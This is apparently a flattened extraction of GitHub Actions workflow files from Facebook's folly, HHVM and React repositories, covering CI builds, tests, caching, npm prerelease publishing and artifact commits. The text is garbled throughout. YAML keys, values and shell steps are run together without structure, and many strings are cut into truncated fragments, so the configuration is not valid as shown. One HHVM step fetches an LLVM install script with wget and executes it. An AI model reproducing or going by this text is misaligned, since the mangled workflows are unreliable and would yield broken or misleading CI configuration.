build/fbcode_builder/getdeps.py build --free-up-disk --no-tests double-conversionpython build/fbcode_builder/getdeps.py build --free-up-disk --no-tests fast_floatpython build/fbcode_builder/getdeps.py build --free-up-disk --no-tests fmtpython build/fbcode_builder/getdeps.py build --free-up-disk --no-tests gflagspython build/fbcode_builder/getdeps.py build --free-up-disk --no-tests glogpython build/fbcode_builder/getdeps.py build --free-up-disk --no-tests googletestpython build/fbcode_builder/getdeps.py build --free-up-disk --no-tests libdwarfpython build/fbcode_builder/getdeps.py build --free-up-disk --no-tests lz4Restore jom from cacherestore_jom${{ steps.paths.outputs.jom_INSTALL }}${{ steps.paths.outputs.jom_CACHE_KEY }}-installBuild jom${{ steps.paths.outputs.jom_SOURCE && ! steps.restore_jom.outputs.cache-hit }}python build/fbcode_builder/getdeps.py build --free-up-disk --no-tests jomname: Build jomSave jom to cacheRestore perl from cacherestore_perl${{ steps.paths.outputs.perl_INSTALL }}${{ steps.paths.outputs.perl_CACHE_KEY }}-installBuild perl${{ steps.paths.outputs.perl_SOURCE && ! steps.restore_perl.outputs.cache-hit }}python build/fbcode_builder/getdeps.py build --free-up-disk --no-tests perlname: Build perlSave perl to cachepython build/fbcode_builder/getdeps.py build --free-up-disk --no-tests opensslpython build/fbcode_builder/getdeps.py build --free-up-disk --no-tests snappypython build/fbcode_builder/getdeps.py build --free-up-disk --no-tests zlibpython build/fbcode_builder/getdeps.py build --free-up-disk --no-tests zstdpython build/fbcode_builder/getdeps.py build --free-up-disk --no-tests libeventpython build/fbcode_builder/getdeps.py build --src-dir=. follypython  ... . follypython build/fbcode_builder/getdeps.py fixup-dyn-deps --src-dir=. folly _artifacts/windows  --final-install-prefix /usr/localpython  ... r/localpython build/fbcode_builder/getdeps.py test --src-dir=. folly- name: ... ronmentruns-on ... ws-2019name: windows/home/huawei/github-actions-security/.github/workflows/facebook_folly__oss-build-and-test.ymlBuck build and test[push,  ... spatch]get-toolchains-to-installget-too ... installsubmodules: 'true'facebook/install-dotslash@latestfaceboo ... @latestuses: f ... @latestget_buck_graphBUCK_GRAPH=$(./buck2 cquery ... --output-attribute '^buck.type$|^name$')
echo "$BUCK_GRAPH" > buck_graph_results.json
name: get_buck_graphCheck if rust_binarycheck_rustOUTPUT=$(cat buck_graph_results.json)
if [[ "$OUTPUT" == *"rust_binary"* ]]; then
  echo "uses_rust=true" >> $GITHUB_ENV
fi
name: C ... _binaryCheck if cxx_binarycheck_cxxOUTPUT=$(cat buck_graph_results.json)
if [[ "$OUTPUT" == *"cxx_binary"* ]]; then
  echo "uses_cxx=true" >> $GITHUB_ENV
fi
Check if ocaml_binaryCheck i ... _binarycheck_ocamlOUTPUT=$(cat buck_graph_results.json)
if [[ "$OUTPUT" == *"ocaml_binary"* ]]; then
  echo "uses_ocaml=true" >> $GITHUB_ENV
fi
Check if python_binarycheck_pythonOUTPUT=$(cat buck_graph_results.json)
if [[ "$OUTPUT" == *"python_binary"* ]]; then
  echo "uses_python=true" >> $GITHUB_ENV
fi
uses_rust${{ env.uses_rust }}uses_cxx${{ env.uses_cxx }}uses_ocaml${{env.uses_ocaml}}uses_python${{env.uses_python}}uses_ru ... rust }}ubuntu-os-buck-build-and-testubuntu- ... nd-testsudo apt-get updaterun: su ...  updateInstall Rust toolchainInstall ... olchainneeds.get-toolchains-to-install.outputs.uses_rust == 'true'needs.g ...  'true'dtolnay/rust-toolchain@stabledtolnay ... @stablename: I ... olchainInstall C++ toolchainneeds.get-toolchains-to-install.outputs.uses_cxx == 'true'sudo apt-get install cmake llvm cppcheck python3-pip
sudo pip3 install conan==1.*
Install OCaml toolchainneeds.get-toolchains-to-install.outputs.uses_ocaml == 'true'ocaml/setup-ocaml@v2ocaml-compiler5.1"5.1"ocaml-c ... : "5.1"Install Python toolchainneeds.get-toolchains-to-install.outputs.uses_python == 'true'python- ...  '3.10'buck2 build and testbash ./.github/scripts/buck_build_and_test.shbash ./ ... test.shname: b ... nd testneeds:  ... installwindows-os-buck-build-and-testwindows ... nd-testchoco install llvm cmake conan cppcheck -y
if ($LASTEXITCODE -eq 3010) { $LASTEXITCODE = 0 }
4.12.0"4.12.0"ocaml-c ... 4.12.0"mac-os-buck-build-and-testmac-os- ... nd-testbrew install cmake llvm cppcheck python3 conan@1
Install homebrew depsInstall ... ew depsBUCK_GRAPH=$(./buck2 cquery "attrregexfilter(labels, 'third-party:homebrew:', deps(//...))" --json --output-attribute=labels)
HOMEBREW_PACKAGES=$(echo $BUCK_GRAPH | jq '[.[] | .labels] | flatten | unique | map(select(contains("third-party:homebrew:")) | sub("third-party:homebrew:"; "")) | .[] | @text')
echo $HOMEBREW_PACKAGES
echo $HOMEBREW_PACKAGES | xargs brew install pkg-config
name: I ... ew depsget-too ... nstall:name: B ... nd test/home/huawei/github-actions-security/.github/workflows/facebook_hhvm__ubuntu.ymlUbuntu CIbranches-ignoreexport-D+'export-D+'- 'export-D+'branches-ignore:ubuntu-ci-${{ github.event_name == 'pull_request' && github.ref || github.run_id }}ubuntu- ... n_id }}group:  ... n_id }}OUT${{ format('{0}/out', github.workspace) }}${{ for ... ace) }}DEBIAN_FRONTENDnoninteractive"noninteractive"OUT: ${ ... ace) }}build_ubuntu_focal_nightlybuild_u ... nightly16-coreubuntu:focalDISTROubuntu-20.04-focalIS_NIGHTLYCLANG_VERSION12DISTRO: ... 4-focalimage: ubuntu:focalInstalling dependencies to bootstrap envInstall ... rap envapt update -y && apt install -y git wget lsb-release software-properties-common gpgapt upd ... mon gpgname: I ... rap envInstalling llvmwget https://apt.llvm.org/llvm.sh
chmod +x llvm.sh
# Note: Keep this version in sync with the one in the Debian control file.
./llvm.sh ${CLANG_VERSION}
name: I ... ng llvmMaking LLVM the default compilerMaking  ... ompilerif [ -f /etc/alternatives/cc ]
then
  update-alternatives --remove-all cc
fi

if [ -f /etc/alternatives/c++ ]
then
  update-alternatives --remove-all c++
fi

update-alternatives --install /usr/bin/cc cc /usr/bin/clang++-${CLANG_VERSION} 500
update-alternatives --set cc /usr/bin/clang++-${CLANG_VERSION}
update-alternatives --install /usr/bin/c++ c++ /usr/bin/clang++-${CLANG_VERSION} 500
update-alternatives --set c++ /usr/bin/clang++-${CLANG_VERSION}
name: M ... ompilerFetching HHVM and its submodulesFetchin ... modules'recursive'submodu ... ursive'name: F ... modulesInstalling HHVM deps and building HHVMInstall ... ng HHVMci/bin/make-debianish-packageci/bin/ ... packagename: I ... ng HHVMUploading artifactsactions/upload-artifact@v3actions ... fact@v3out-directory${{ env.OUT }}name: out-directory- name: ... rap envruns-on: 16-corebuild_u ... ightly:name: Ubuntu CI/home/huawei/github-actions-security/.github/workflows/facebook_react__compiler_discord_notify.yml(Compiler) Discord Notify(Compil ...  Notifycompiler/**.github/workflows/compiler_**.yml.github ... _**.yml- compiler/**check_accessis_member_or_collaboratoris_memb ... borator${{ steps.check_is_member_or_collaborator.outputs.is_member_or_collaborator }}${{ ste ... ator }}is_memb ... ator }}echo ${{ github.event.pull_request.author_association }}echo ${ ... tion }}run: ec ... tion }}Check is member or collaboratorCheck i ... boratorcheck_is_member_or_collaboratorcheck_i ... borator${{ github.event.pull_request.author_association == 'MEMBER' || github.event.pull_request.author_association == 'COLLABORATOR' }}${{ git ... TOR' }}echo "is_member_or_collaborator=true" >> "$GITHUB_OUTPUT"echo "i ... OUTPUT"name: C ... borator- run:  ... tion }}check_maintainer${{ needs.check_access.outputs.is_member_or_collaborator == 'true' || needs.check_access.outputs.is_member_or_collaborator == true }}${{ nee ... true }}[check_access]facebook/react/.github/workflows/shared_check_maintainer.yml@mainfaceboo ... ml@mainactor${{ github.event.pull_request.user.login }}actor:  ... ogin }}if: ${{ ... true }}notify${{ needs.check_maintainer.outputs.is_core_team == 'true' }}Discord Webhook ActionDiscord ...  Actiontsickert/discord-webhook@86dc739f3f165f16dadc5666051c367efa1692f4tsicker ... a1692f4webhook-url${{ secrets.COMPILER_DISCORD_WEBHOOK_URL }}embed-author-nameembed-author-url${{ github.event.pull_request.user.html_url }}embed-author-icon-urlembed-a ... con-url${{ github.event.pull_request.user.avatar_url }}embed-title#${{ github.event.number }} (+${{github.event.pull_request.additions}} -${{github.event.pull_request.deletions}}): ${{ github.event.pull_request.title }}'#${{ g ... tle }}'embed-description${{ github.event.pull_request.body }}embed-urlwebhook ... _URL }}name: D ...  Action- name: ...  Actionif: ${{ ... rue' }}check_access:name: ( ...  Notify/home/huawei/github-actions-security/.github/workflows/facebook_react__compiler_playground.yml(Compiler) Playground(Compil ... yground.github/workflows/compiler_playground.yml.github ... und.yml${{ github.workflow }}-${{ github.ref_name }}-${{ github.event.pull_request.number || github.run_id }}${{ git ... n_id }}TZ/usr/share/zoneinfo/America/Los_Angeles/usr/sh ... AngelesSEGMENT_DOWNLOAD_TIMEOUT_MINSSEGMENT ... UT_MINSTZ: /us ... Angelescompiler/apps/playgroundcompile ... ygroundworking ... ygroundplaygroundTest playground'.nvmrc'compiler/**/yarn.lockcompile ... rn.locknode-ve ... .nvmrc'Restore cached node_modulesRestore ... modulesnode_modules**/node_modules
compiler-and-playground-node_modules-v6-${{ runner.arch }}-${{ runner.os }}-${{ hashFiles('compiler/**/yarn.lock') }}compile ... ck') }}path: |name: R ... modulesyarn install --frozen-lockfileyarn in ... ockfilesteps.node_modules.outputs.cache-hit != 'true'steps.n ...  'true'run: ya ... ockfileCheck Playwright versionCheck P ... versionplaywright_versionecho "playwright_version=$(npm ls @playwright/test | grep @playwright | sed 's/.*@//' | head -1)" >> "$GITHUB_OUTPUT"echo "p ... OUTPUT"name: C ... versionCache Playwright Browsers for version ${{ steps.playwright_version.outputs.playwright_version }}Cache P ... sion }}cache_playwright_browserscache_p ... rowsers~/.cache/ms-playwright~/.cach ... ywrightplaywright-browsers-v6-${{ runner.arch }}-${{ runner.os }}-${{ steps.playwright_version.outputs.playwright_version }}playwri ... sion }}path: ~ ... ywrightname: C ... sion }}npx playwright install --with-deps chromiumnpx pla ... hromiumsteps.cache_playwright_browsers.outputs.cache-hit != 'true'run: np ... hromiumnpx playwright install-depsnpx pla ... ll-depssteps.cache_playwright_browsers.outputs.cache-hit == 'true'run: np ... ll-depsCI=true yarn testrun: CI ... rn testls -R test-results!cancelled()'!cancelled()'run: ls ... resultsArchive test resultstest-resultscompiler/apps/playground/test-resultscompile ... resultsname: test-resultsname: A ... resultsname: T ... ygroundplayground:name: ( ... yground/home/huawei/github-actions-security/.github/workflows/facebook_react__compiler_prereleases.yml(Compiler) Publish Prereleases(Compil ... eleasescommit_sha''release_channeldist_tagversion_nametag_versionrequired: falsecommit_sha:NPM_TOKENNPM_TOKEN:working ... ompilerpublish_prereleasePublish prelease (${{ inputs.release_channel }}) ${{ inputs.commit_sha }} @${{ inputs.dist_tag }}Publish ... _tag }}compiler/yarn.lockcompiler-node_modules-v6-${{ runner.arch }}-${{ runner.os }}-${{ hashFiles('compiler/yarn.lock') }}Publish packages to npmPublish ...  to npmcp ./scripts/release/ci-npmrc ~/.npmrc
scripts/release/publish.js --frfr --ci --versionName=${{ inputs.version_name }} --tag=${{ inputs.dist_tag }} ${{ inputs.tag_version && format('--tagVersion={0}', inputs.tag_version) || '' }}
name: P ...  to npmname: P ... _tag }}publish_prerelease:name: ( ... eleases/home/huawei/github-actions-security/.github/workflows/facebook_react__compiler_prereleases_manual.yml(Compiler) Publish Prereleases Manual(Compil ...  Manualprerelease_commit_shaprerele ... mit_shaprerele ... it_sha:publish_prerelease_experimentalpublish ... imentalPublish to Experimental channelPublish ... channelfacebook/react/.github/workflows/compiler_prereleases.yml@main${{ inputs.prerelease_commit_sha || github.sha }}${{ inp ... .sha }}${{ inputs.release_channel }}${{ inp ... nnel }}${{ inputs.dist_tag }}${{ inp ... _tag }}${{ inputs.version_name }}${{ inp ... name }}${{ inputs.tag_version }}commit_ ... .sha }}NPM_TOK ... OKEN }}publish ... mental:name: ( ...  Manual/home/huawei/github-actions-security/.github/workflows/facebook_react__compiler_prereleases_nightly.yml(Compiler) Publish Prereleases Nightly(Compil ... Nightly10 16 * * 1,2,3,4,5cron: 1 ... 2,3,4,5- cron: ... 2,3,4,5${{ github.sha }}experimental0.0.0'0.0.0'name: ( ... Nightly/home/huawei/github-actions-security/.github/workflows/facebook_react__compiler_typescript.yml(Compiler) TypeScript(Compil ... eScript.github/workflows/compiler_typescript.yml.github ... ipt.ymldiscover_yarn_workspacesdiscove ... kspacesDiscover yarn workspacesDiscove ... kspaces${{ steps.set-matrix.outputs.matrix }}${{ ste ... trix }}matrix: ... trix }}set-matrixecho "matrix=$(find packages -mindepth 1 -maxdepth 1 -type d | sed 's!packages/!!g' | tr '\n' ',' | sed s/.$// | jq -Rsc '. / "," - [""]')" >> $GITHUB_OUTPUTecho "m ... _OUTPUTid: set-matrixname: D ... kspacesLint babel-plugin-react-compilerLint ba ... ompileryarn workspace babel-plugin-react-compiler lintyarn wo ... er lintrun: ya ... er lintname: L ... ompilerjestJest babel-plugin-react-compilerJest ba ... ompileryarn workspace babel-plugin-react-compiler jestyarn wo ... er jestrun: ya ... er jestname: J ... ompilerTest ${{ matrix.workspace_name }}Test ${ ... name }}workspace_name${{ fromJSON(needs.discover_yarn_workspaces.outputs.matrix) }}${{ fro ... rix) }}workspa ... rix) }}xvfb-run -a yarn workspace ${{ matrix.workspace_name }} testxvfb-ru ... }} testrunner.os == 'Linux' && matrix.workspace_name == 'react-forgive'runner. ... orgive'run: xv ... }} testyarn workspace ${{ matrix.workspace_name }} testyarn wo ... }} testmatrix.workspace_name != 'react-forgive'matrix. ... orgive'run: ya ... }} testname: T ... name }}discove ... spaces:name: ( ... eScript/home/huawei/github-actions-security/.github/workflows/facebook_react__devtools_regression_tests.yml(DevTools) Regression Tests(DevToo ... n Testscron: 0 0 * * *- cron: 0 0 * * *download_buildDownload base buildruntime-release-node_modules-v6-${{ runner.arch }}-${{ runner.os }}-${{ hashFiles('yarn.lock', 'scripts/release/yarn.lock') }}runtime ... ck') }}Ensure clean build directoryEnsure  ... rectoryrm -rf buildname: E ... rectoryyarn --cwd scripts/release install --frozen-lockfileyarn -- ... ockfileDownload react-devtools artifacts for base revisionDownloa ... evisiongit fetch origin main
GH_TOKEN=${{ github.token }} scripts/release/download-experimental-build.js --commit=${{ inputs.commit_sha || '$(git rev-parse origin/main)' }}
name: D ... evisionDisplay structure of buildDisplay ... f buildls -R buildname: D ... f buildArchive builderrorname: Archive buildname: D ... e buildbuild_devtools_and_process_artifactsbuild_d ... tifactsBuild DevTools and process artifactsBuild D ... tifactsruntime-node_modules-v6-${{ runner.arch }}-${{ runner.os }}-${{ hashFiles('yarn.lock') }}Restore archived buildRestore ... d buildname: R ... d build./scripts/ci/pack_and_store_devtools_artifacts.sh./scrip ... acts.shRELEASE_CHANNELRELEASE ... imentalrun: ./ ... acts.shArchive devtools buildArchive ... s buildreact-devtoolsbuild/devtools.tgzname: react-devtoolsname: A ... s buildArchive chrome extensionArchive ... tensionreact-devtools-chrome-extensionreact-d ... tensionbuild/devtools/chrome-extension.zipbuild/d ... ion.zipname: r ... tensionname: A ... tensionArchive firefox extensionreact-devtools-firefox-extensionbuild/devtools/firefox-extension.zipname: B ... tifactsrun_devtools_tests_for_versionsrun_dev ... ersionsRun DevTools tests for versionsRun Dev ... ersions16.0"16.0"16.5"16.5"16.8"16.8"17.0"17.0"18.0"18.0"18.2"18.2"- "16.0"Restore all archived build artifacts./scripts/ci/download_devtools_regression_build.js ${{ matrix.version }} --replaceBuild./scrip ... ceBuildrun: ./ ... ceBuildnode ./scripts/jest/jest-cli.js --build --project devtools --release-channel=experimental --reactVersion ${{ matrix.version }} --cinode ./ ... }} --cirun: no ... }} --ciname: R ... ersionsrun_devtools_e2e_tests_for_versionsRun DevTools e2e tests for versionsnpx playwright install --with-depsnpx pla ... th-depsrun: np ... th-deps./scripts/ci/download_devtools_regression_build.js ${{ matrix.version }}./scrip ... sion }}run: ./ ... sion }}ls -R build-regressionls -R b ... ressionrun: ls ... ression./scripts/ci/run_devtools_e2e_tests.js ${{ matrix.version }}Cleanup build regression folderCleanup ...  folderrm -r ./build-regressionrm -r . ... ressionname: C ...  folderscreenshots./tmp/screenshotswarnname: screenshotsdownload_build:name: ( ... n Tests/home/huawei/github-actions-security/.github/workflows/facebook_react__runtime_build_and_test.yml(Runtime) Build and Test(Runtim ... nd Testruntime_node_modules_cacheruntime ... s_cacheCache Runtime node_modulesCache R ... modules${{ github.event.pull_request.head.sha || github.sha }}Check cache hitlookup-onlyname: C ... che hitWarm with old cacheruntime-node_modules-v6-${{ runner.arch }}-${{ runner.os }}-
runtime-node_modules-v6-
name: W ... d cacheruntime_compiler_node_modules_cacheCache Runtime, Compiler node_modulesruntime-and-compiler-node_modules-v6-${{ runner.arch }}-${{ runner.os }}-${{ hashFiles('yarn.lock', 'compiler/yarn.lock') }}yarn.lock
compiler/yarn.lock
runtime-and-compiler-node_modules-v6-${{ runner.arch }}-${{ runner.os }}-
runtime-and-compiler-node_modules-v6-
yarn --cwd compiler install --frozen-lockfilediscover_flow_inline_configsdiscove ... configsDiscover flow inline configsDiscove ... configs${{ steps.set-matrix.outputs.result }}${{ ste ... sult }}matrix: ... sult }}actions/github-script@v7actions ... ript@v7const inlinedHostConfigs = require('./scripts/shared/inlinedHostConfigs.js');
return inlinedHostConfigs.map(config => config.shortName);
uses: a ... ript@v7name: D ... configsflowFlow check ${{ matrix.flow_inline_config_shortname }}Flow ch ... name }}[discov ... _cache]flow_inline_config_shortnameflow_in ... ortname${{ fromJSON(needs.discover_flow_inline_configs.outputs.matrix) }}flow_in ... rix) }}node ./scripts/tasks/flow-ci ${{ matrix.flow_inline_config_shortname }}node ./ ... name }}run: no ... name }}name: F ... name }}check_generated_fizz_runtimecheck_g ... runtimeConfirm generated inline Fizz runtime is up to dateConfirm ... to date[runtim ... _cache]yarn generate-inline-fizz-runtime
git diff --quiet || (echo "There was a change to the Fizz runtime. Run `yarn generate-inline-fizz-runtime` and check in the result." && false)
name: C ... to dateflagsCheck flagsyarn flagsrun: yarn flagsname: Check flagsyarn test ${{ matrix.params }} (Shard ${{ matrix.shard }})yarn te ... ard }})params-r=stable --env=development"-r=sta ... opment"-r=stable --env=production"-r=sta ... uction"-r=experimental --env=development"-r=exp ... opment"-r=experimental --env=production"-r=exp ... uction"-r=www-classic --env=development --variant=false"-r=www ... =false"-r=www-classic --env=production --variant=false-r=www-classic --env=development --variant=true"-r=www ... t=true"-r=www-classic --env=production --variant=true-r=www-modern --env=development --variant=false-r=www-modern --env=production --variant=false-r=www-modern --env=development --variant=true-r=www-modern --env=production --variant=true-r=xplat --env=development --variant=false"-r=xpl ... =false"-r=xplat --env=development --variant=true"-r=xpl ... t=true"-r=xplat --env=production --variant=false-r=xplat --env=production --variant=true-r=stable --env=development --persistent"-r=sta ... istent"-r=experimental --env=development --persistent"-r=exp ... istent"- "-r=s ... opment"1/52/53/54/55/5- 1/5params:yarn test ${{ matrix.params }} --ci --shard=${{ matrix.shard }}yarn te ... hard }}run: ya ... hard }}name: y ... ard }})build_and_lintyarn build and lintworker_id246913142324[0,1,2, ... ,23,24]stable[stable ... mental]worker_ ... ,23,24]11.0.22distrib ... temurinuses: a ... java@v4yarn build --index=${{ matrix.worker_id }} --total=25 --r=${{ matrix.release_channel }} --ciyarn bu ... }} --ciCIgithub${{ matrix.release_channel }}${{ mat ... nnel }}NODE_INDEX${{ matrix.worker_id }}${{ mat ... r_id }}CI: githubrun: ya ... }} --ciLint buildyarn lint-buildname: Lint build_build_${{ matrix.worker_id }}_${{ matrix.release_channel }}_build_ ... nnel }}name: _ ... nnel }}name: y ... nd linttest_buildyarn test-build[build_ ... _cache]test_params-r=stab ... lopment-r=stab ... duction-r=expe ... lopment-r=expe ... duction--project=devtools -r=experimental--proje ... imental1/102/103/104/105/106/107/108/109/1010/10- 1/10test_params: [pattern_build_*merge-multiplepattern: _build_*yarn test --build ${{ matrix.test_params }} --shard=${{ matrix.shard }} --ciyarn te ... }} --ciname: y ... t-buildprocess_artifacts_combinedprocess ... ombinedProcess artifacts combinedProcess ... ombinedattestationsecho ${{ github.event.pull_request.head.sha || github.sha }} >> build/COMMIT_SHAecho ${ ... MIT_SHArun: ec ... MIT_SHAScrape warning messagesScrape  ... essagesmkdir -p ./build/__test_utils__
node ./scripts/print-warnings/print-warnings.js > build/__test_utils__/ReactAllWarnings.js
name: S ... essagestar -zcvf ./build.tgz ./buildtar -zc ... ./buildrun: ta ... ./buildcp ./build.tgz ./build2.tgzcp ./bu ... ld2.tgzrun: cp ... ld2.tgzArchive build artifactsArchive ... tifactsupload_artifacts_combinedupload_ ... ombinedartifacts_combined./build.tgz
./build2.tgz
name: a ... ombinedactions/attest-build-provenance@v2actions ... ance@v2github.event_name == 'push' && github.ref_name == 'main' || github.event.pull_request.head.repo.full_name == github.repositorygithub. ... ositorysubject-nameartifacts_combined.zipartifac ... ned.zipsubject-digestsha256:${{ steps.upload_artifacts_combined.outputs.artifact-digest }}sha256: ... gest }}subject ... ned.zipuses: a ... ance@v2name: P ... ombinedcheck_error_codesSearch build artifacts for unminified errorsSearch  ...  errorsyarn extract-errors
git diff --quiet || (echo "Found unminified errors. Either update the error codes map or disable error minification for the affected build, if appropriate." && false)
name: S ...  errorscheck_release_dependenciescheck_r ... denciesCheck release dependenciesCheck r ... denciesyarn check-release-dependenciesyarn ch ... denciesrun: ya ... denciesname: C ... denciesRELEASE_CHANNEL_stable_yarn_test_dom_fixturesRELEASE ... ixturesCheck fixtures DOM (stable)Check f ... stable)fixtures_dom-node_modules-v6-${{ runner.arch }}-${{ runner.os }}-${{ hashFiles('yarn.lock', 'fixtures/dom/yarn.lock') }}fixture ... ck') }}yarn --cwd fixtures/dom install --frozen-lockfileRun DOM fixture testsRun DOM ... e testsyarn predev
yarn test
fixtures/domRELEASE ...  stablename: R ... e testsname: C ... stable)run_fixtures_flight_testsrun_fix ... t_testsRun fixtures Flight testsRun fix ... t testsfixtures_flight-node_modules-v6-${{ runner.arch }}-${{ runner.os }}-${{ hashFiles('yarn.lock', 'fixtures/flight/yarn.lock') }}yarn --cwd fixtures/flight install --frozen-lockfilePlaywright install depsPlaywri ... ll depsfixtures/flightname: P ... ll depsyarn testDEBUGpw:webserverDEBUG: pw:webserverArchive Flight fixture artifactsflight-playwright-reportflight- ... -reportfixtures/flight/playwright-reportfixture ... -reportname: f ... -reportflight-test-resultsfixtures/flight/test-resultsfixture ... resultsname: f ... resultsname: R ... t testsbrowserchromefirefoxedge[chrome ... , edge]browser ... , edge]./scripts/ci/pack_and_store_devtools_artifacts.sh ${{ matrix.browser }}./scrip ... wser }}run: ./ ... wser }}Archive ${{ matrix.browser }} extensionreact-devtools-${{ matrix.browser }}-extensionbuild/devtools/${{ matrix.browser }}-extension.zipmerge_devtools_artifactsmerge_d ... tifactsMerge DevTools artifactsMerge D ... tifactsMerge artifactsactions/upload-artifact/merge@v4actions ... erge@v4react-devtools-*-extensionname: M ... tifacts- name: ... tifactsrun_devtools_e2e_testsrun_dev ... e_testsRun DevTools e2e testsRun Dev ... e testsnpx playwright install
sudo npx playwright install-deps
./scripts/ci/run_devtools_e2e_tests.js./scrip ... ests.jsrun: ./ ... ests.jssizebot${{ github.event_name == 'pull_request' && github.ref_name != 'main' && github.event.pull_request.base.ref == 'main' }}${{ git ... ain' }}Run sizebot[build_and_lint]Download artifacts for base revisionGH_TOKEN=${{ github.token }} scripts/release/download-experimental-build.js --commit=$(git rev-parse ${{ github.event.pull_request.base.sha }}) ${{ (github.event.pull_request.head.repo.full_name != github.repository && '--noVerify') || ''}}
mv ./build ./base-build
Delete extraneous filesDelete  ... s filesrm -rf ./base-build/node_modulesrm -rf  ... modulesname: D ... s filesDisplay structure of base-build from origin/mainDisplay ... in/mainls -R base-buildname: D ... in/mainRestore archived build for PRRestore ...  for PRname: R ...  for PRDisplay structure of build for PRDisplay ...  for PRname: D ...  for PRnode ./scripts/tasks/dangernode ./ ... /dangerrun: no ... /dangerArchive sizebot resultsArchive ... resultssizebot-messagesizebot-message.mdname: s ... messageif: ${{ ... ain' }}runtime ... _cache:name: ( ... nd Test/home/huawei/github-actions-security/.github/workflows/facebook_react__runtime_commit_artifacts.yml(Runtime) Commit Artifacts for Meta WWW and fbsource V2(Runtim ... urce V2workflow_runworkflows"(Runti ... d Test"["(Runt ...  Test"]completed[completed]workflo ...  Test"]forceForce a commit to the builds/... branches'Force  ... anches'descrip ... anches'dry_runPerform a dry run (run everything except push)Perform ... t push)descrip ... t push)workflow_run:download_artifactsGH_TOKEN=${{ github.token }} scripts/release/download-experimental-build.js --commit=${{ inputs.commit_sha || github.event.workflow_run.head_sha || github.sha }}
build/process_artifacts[download_artifacts]www_branch_count${{ steps.check_branches.outputs.www_branch_count }}${{ ste ... ount }}fbsource_branch_countfbsourc ... h_count${{ steps.check_branches.outputs.fbsource_branch_count }}last_version_classic${{ steps.get_last_version_www.outputs.last_version_classic }}${{ ste ... ssic }}last_version_modern${{ steps.get_last_version_www.outputs.last_version_modern }}${{ ste ... dern }}last_version_rn${{ steps.get_last_version_rn.outputs.last_version_rn }}${{ ste ... n_rn }}current_version_classiccurrent ... classic${{ steps.get_current_version.outputs.current_version_classic }}current_version_moderncurrent ... _modern${{ steps.get_current_version.outputs.current_version_modern }}current_version_rn${{ steps.get_current_version.outputs.current_version_rn }}www_bra ... ount }}builds/facebook-wwwref: bu ... ook-wwwGet last version string for www"Get la ... or www"get_last_version_www# Empty checks only needed for backwards compatibility,can remove later.
VERSION_CLASSIC=$( [ -f ./compiled/facebook-www/VERSION_CLASSIC ] && cat ./compiled/facebook-www/VERSION_CLASSIC || echo '' )
VERSION_MODERN=$( [ -f ./compiled/facebook-www/VERSION_MODERN ] && cat ./compiled/facebook-www/VERSION_MODERN || echo '' )
echo "Last classic version is $VERSION_CLASSIC"
echo "Last modern version is $VERSION_MODERN"
echo "last_version_classic=$VERSION_CLASSIC" >> "$GITHUB_OUTPUT"
echo "last_version_modern=$VERSION_MODERN" >> "$GITHUB_OUTPUT"
name: " ... or www"builds/facebook-fbsourcebuilds/ ... bsourceref: bu ... bsourceGet last version string for rn"Get la ... for rn"get_last_version_rn# Empty checks only needed for backwards compatibility,can remove later.
VERSION_NATIVE_FB=$( [ -f ./compiled-rn/VERSION_NATIVE_FB ] && cat ./compiled-rn/VERSION_NATIVE_FB || echo '' )
echo "Last rn version is $VERSION_NATIVE_FB"
echo "last_version_rn=$VERSION_NATIVE_FB" >> "$GITHUB_OUTPUT"
name: " ... for rn"Check branches"Check branches"check_branchesecho "www_branch_count=$(git ls-remote --heads origin "refs/heads/meta-www" | wc -l)" >> "$GITHUB_OUTPUT"
echo "fbsource_branch_count=$(git ls-remote --heads origin "refs/heads/meta-fbsource" | wc -l)" >> "$GITHUB_OUTPUT"
name: " ... anches"Restore downloaded buildStrip @license from eslint plugin and react-refreshStrip @ ... refreshsed -i -e 's/ @license React*//' \
  build/oss-experimental/eslint-plugin-react-hooks/cjs/eslint-plugin-react-hooks.development.js \
  build/oss-experimental/react-refresh/cjs/react-refresh-babel.development.js
name: S ... refreshInsert @headers into eslint plugin and react-refreshInsert  ... refreshsed -i -e 's/ LICENSE file in the root directory of this source tree./ LICENSE file in the root directory of this source tree.\n *\n * @noformat\n * @nolint\n * @lightSyntaxTransform\n * @preventMunge\n * @oncall react_core/' \
  build/oss-experimental/eslint-plugin-react-hooks/cjs/eslint-plugin-react-hooks.development.js \
  build/oss-experimental/react-refresh/cjs/react-refresh-babel.development.js
name: I ... refreshMove relevant files for React in www into compiledMove re ... ompiled# Move the facebook-www folder into compiled
mkdir ./compiled
mv build/facebook-www ./compiled

# Move ReactAllWarnings.js to facebook-www
mkdir ./compiled/facebook-www/__test_utils__
mv build/__test_utils__/ReactAllWarnings.js ./compiled/facebook-www/__test_utils__/ReactAllWarnings.js

# Copy eslint-plugin-react-hooks
mkdir ./compiled/eslint-plugin-react-hooks
cp build/oss-experimental/eslint-plugin-react-hooks/cjs/eslint-plugin-react-hooks.development.js \
  ./compiled/eslint-plugin-react-hooks/index.js

# Move unstable_server-external-runtime.js into facebook-www
mv build/oss-experimental/react-dom/unstable_server-external-runtime.js \
  ./compiled/facebook-www/unstable_server-external-runtime.js

# Move react-refresh-babel.development.js into babel-plugin-react-refresh
mkdir ./compiled/babel-plugin-react-refresh
mv build/oss-experimental/react-refresh/cjs/react-refresh-babel.development.js \
  ./compiled/babel-plugin-react-refresh/index.js

ls -R ./compiled
name: M ... ompiledMove relevant files for React in fbsource into compiled-rnMove re ... iled-rnBASE_FOLDER='compiled-rn/facebook-fbsource/xplat/js'
mkdir -p ${BASE_FOLDER}/react-native-github/Libraries/Renderer/
mkdir -p ${BASE_FOLDER}/RKJSModules/vendor/react/{scheduler,react,react-dom,react-is,react-test-renderer}/

# Move React Native renderer
mv build/react-native/implementations/ $BASE_FOLDER/react-native-github/Libraries/Renderer/
mv build/react-native/shims/ $BASE_FOLDER/react-native-github/Libraries/Renderer/
mv build/facebook-react-native/scheduler/cjs/ $BASE_FOLDER/RKJSModules/vendor/react/scheduler/
mv build/facebook-react-native/react/cjs/ $BASE_FOLDER/RKJSModules/vendor/react/react/
mv build/facebook-react-native/react-dom/cjs/ $BASE_FOLDER/RKJSModules/vendor/react/react-dom/
mv build/facebook-react-native/react-is/cjs/ $BASE_FOLDER/RKJSModules/vendor/react/react-is/
mv build/facebook-react-native/react-test-renderer/cjs/ $BASE_FOLDER/RKJSModules/vendor/react/react-test-renderer/

# Delete OSS renderer. OSS renderer is synced through internal script.
RENDERER_FOLDER=$BASE_FOLDER/react-native-github/Libraries/Renderer/implementations/
rm $RENDERER_FOLDER/ReactFabric-{dev,prod,profiling}.js
